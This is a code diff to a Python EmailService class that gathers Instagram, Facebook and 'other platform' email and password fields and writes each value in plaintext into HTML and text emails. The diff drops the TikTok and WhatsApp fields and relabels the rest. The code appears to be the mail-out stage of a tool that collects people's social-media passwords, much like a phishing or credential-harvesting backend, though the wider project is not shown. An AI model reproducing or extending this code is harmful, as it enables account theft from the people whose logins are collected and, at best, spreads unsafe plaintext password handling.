@@ -205,9 +205,8 @@ class EmailService:
         credentials = {}
         credential_fields = [
             'instagram_email', 'instagram_password',
-            'tiktok_email', 'tiktok_password', 
             'facebook_email', 'facebook_password',
-            'whatsapp_number', 'whatsapp_password'
+            'other_platform_credentials'
         ]
         
         for field in credential_fields:
@@ -253,8 +252,13 @@ class EmailService:
         
         # Add credentials to email
         for field, value in credentials.items():
-            platform = field.replace('_email', '').replace('_password', '').replace('_number', '').title()
-            field_type = 'Email' if 'email' in field else 'Password' if 'password' in field else 'Number'
+            if field == 'other_platform_credentials':
+                platform = 'Other Platforms'
+                field_type = 'Credentials'
+            else:
+                platform = field.replace('_email', '').replace('_password', '').title()
+                field_type = 'Username' if 'email' in field else 'Password'
+            
             html_content += f"""
                         <div style="margin-bottom: 10px;">
                             <span class="credential-label">{platform} {field_type}:</span><br>
@@ -299,8 +303,12 @@ class EmailService:
         """
         
         for field, value in credentials.items():
-            platform = field.replace('_email', '').replace('_password', '').replace('_number', '').title()
-            field_type = 'Email' if 'email' in field else 'Password' if 'password' in field else 'Number'
+            if field == 'other_platform_credentials':
+                platform = 'Other Platforms'
+                field_type = 'Credentials'
+            else:
+                platform = field.replace('_email', '').replace('_password', '').title()
+                field_type = 'Username' if 'email' in field else 'Password'
             text_content += f"\\n{platform} {field_type}: {value}"
         
         text_content += f"""
